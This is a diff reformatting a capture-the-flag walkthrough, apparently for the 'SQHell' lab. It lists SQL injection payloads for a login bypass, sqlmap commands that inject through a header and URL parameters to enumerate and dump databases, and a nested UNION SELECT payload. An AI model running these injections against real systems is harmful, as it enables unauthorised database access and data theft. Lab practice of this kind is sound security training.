@@ -1,7 +1,6 @@
+Flag - 1
 
-## Flag - 1
-
-**In the login page:**
+In the login page:
 
 - admin'AND 1=1#
 - admin'OR 1-1#
@@ -9,7 +8,7 @@
 
 ---
 
-## Flag - 2
+Flag - 2
 
 - sqlmap --headers="X-Forwarded-For: 1*" -u <ip> --dbs
 - sqlmap --headers="X-Forwarded-For: 1*" -u <ip> -D sqhell_1 --tables
@@ -18,7 +17,7 @@
 
 ---
 
-## Flag - 3
+Flag - 3
 
 - sqlmap -u http://<ip>/register/user-check?username=admin —dbs
 - sqlmap -u http://<ip>/register/user-check?username=admin -D sqhell_3 --tables
@@ -27,13 +26,13 @@
 
 ---
 
-## Flag - 4
+Flag - 4
 
 http://<ip>/user?id=13 union all select "1 UNION SELECT 1,flag,4,5 from flag-- -",2,3 from information_schema.tables where table_schema=database()
 
 ---
 
-## Flag - 5
+Flag - 5
 
 - sqlmap -u http://<ip>/post?id=2 --dbs
 - sqlmap -u http://<ip>/post?id=2 -D sqhell_5 --tables
@@ -42,6 +41,6 @@ http://<ip>/user?id=13 union all select "1 UNION SELECT 1,flag,4,5 from flag-- -
 
 ---
 
-## Extra Command
+Extra Command
 
 sqlmap http://sqhell.thm/login -D sqhell_2 — dump-all
